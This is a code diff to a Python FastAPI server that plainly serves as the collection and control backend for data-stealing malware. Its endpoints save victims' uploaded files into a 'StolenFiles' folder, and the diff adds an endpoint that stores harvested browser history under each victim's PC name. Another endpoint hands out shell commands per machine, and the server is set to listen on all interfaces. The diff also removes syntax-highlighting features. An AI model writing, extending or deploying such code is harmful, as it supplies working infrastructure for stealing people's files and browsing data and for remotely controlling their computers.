@@ -1,16 +1,11 @@
-from fastapi import FastAPI, File, UploadFile
+from fastapi import FastAPI, UploadFile
 from pydantic import BaseModel
 import os 
 import threading
-from PIL import Image
-import io 
 import tkinter as tk
 from tkinter import colorchooser
-from pygments import highlight
-from pygments.lexers import get_lexer_by_name
-from pygments.formatters import HtmlFormatter
-import datetime
- 
+import uvicorn
+import json
 def input_dialog(title, message):
     def ok():
         dialog_window.destroy()
@@ -55,7 +50,6 @@ def show_text_in_editor(filename, text):
     # Create a text widget to display the text
     text_widget = tk.Text(root, bg="black", fg="white", font=("Arial", 12))
     text_widget.pack(expand=True, fill="both")
-
     def change_color(color_type, color):
         if color_type == "bg":
             text_widget.config(bg=color)
@@ -70,12 +64,7 @@ def show_text_in_editor(filename, text):
     def change_font_size(size):
         text_widget.config(font=("Arial", size))
 
-    def choose_language(language):
-        lexer = get_lexer_by_name(language)
-        text_html = highlight(text_widget.get("1.0", "end"), lexer, HtmlFormatter(style="colorful"))
-        text_widget.delete("1.0", "end")
-        text_widget.insert("1.0", text_html)
-        text_widget.config(state="disabled")
+    
 
     # Create a menu to change color, font size, and language
     menu_bar = tk.Menu(root)
@@ -104,21 +93,7 @@ def show_text_in_editor(filename, text):
     font_menu.add_command(label="Large", command=lambda: change_font_size(14))
     menu_bar.add_cascade(label="Font Size", menu=font_menu)
 
-    language_menu = tk.Menu(menu_bar, tearoff=0)
-    language_menu.add_command(label="Python", command=lambda: choose_language("python"))
-    language_menu.add_command(label="HTML", command=lambda: choose_language("html"))
-    language_menu.add_command(label="JavaScript", command=lambda: choose_language("javascript"))
-    language_menu.add_command(label="CSS", command=lambda: choose_language("css"))
-    language_menu.add_command(label="JSON", command=lambda: choose_language("json"))
-    language_menu.add_command(label="XML", command=lambda: choose_language("xml"))
-    language_menu.add_command(label="SQL", command=lambda: choose_language("sql"))
-    language_menu.add_command(label="Ruby", command=lambda: choose_language("ruby"))
-    language_menu.add_command(label="Perl", command=lambda: choose_language("perl"))
-    language_menu.add_command(label="Bash", command=lambda: choose_language("bash"))
-    language_menu.add_command(label="C", command=lambda: choose_language("c"))
-    language_menu.add_command(label="C++", command=lambda: choose_language("cpp"))
-    language_menu.add_command(label="Java", command=lambda: choose_language("java"))
-    menu_bar.add_cascade(label="Language", menu=language_menu)
+
 
     root.config(menu=menu_bar)
 
@@ -127,6 +102,12 @@ def show_text_in_editor(filename, text):
 
     # Run the main event loop to display the window
     root.mainloop()
+
+
+class BrowserHistory(BaseModel):
+    DATA:str
+    PCNAME:str
+
 class TextPayload(BaseModel):
     file_name:str
     data:str
@@ -141,10 +122,10 @@ app = FastAPI()
 @app.post("/api/recive/payload",status_code=200)
 async def recivePaylaod(File_param:UploadFile):
     try:
-        os.mkdir(os.getcwd()+"/stolenfiles")
+        os.mkdir(os.getcwd()+"/StolenFiles")
     except:
         pass
-    with open(f"{os.getcwd()}/stolenfiles/{File_param.filename}",'wb') as f:
+    with open(f"{os.getcwd()}/StolenFiles/{File_param.filename}",'wb') as f:
         contents = await File_param.read()
         f.write(contents)
 
@@ -160,7 +141,33 @@ def reciveText(text:TextPayload):
         thread2.join
     return {"STATUS":200}
 
-    
+
+@app.post("/api/recive/text/write",status_code=200)
+async def reciveText(text:TextPayload):
+    TEXT = await show_text_in_editor(text.file_name,text.data)
+    return {"TEXT":TEXT}
+
+@app.post("/api/recive/browser/history",status_code=200)
+def recivehistory(DATA:BrowserHistory):
+    try:
+        os.mkdir(os.getcwd()+"/StolenFiles")
+    except:
+        pass
+
+    try:
+        os.mkdir(os.getcwd()+"/StolenFiles/BrowserData")
+    except:
+        pass
+
+    try:
+        os.mkdir(os.getcwd()+f"/StolenFiles/BrowserData/{DATA.PCNAME}")
+    except:
+        pass
+    data = json.loads(DATA.DATA)
+    with open(f'{os.getcwd()}/StolenFiles/BrowserData/BrowserHistory.json', 'w', encoding='utf-8') as f:
+        json.dump(data, f, ensure_ascii=False, indent=4)
+
+
 class Logs(BaseModel):
     pc_name:str = None
     log:str
@@ -184,6 +191,8 @@ def shell(pcname:str):
     print(res)
     return {"CMD":str(res)}
 
+
+
 """
 ISNT DONE YET
 
@@ -193,4 +202,5 @@ async def upload_image(file: UploadFile = File(...)):
     image = Image.open(io.BytesIO(contents))
     image.save(f"{file.filename}")
     return {"filename": file.filename}
-"""
+""" 
+uvicorn.run(app, host="0.0.0.0", port=8000)
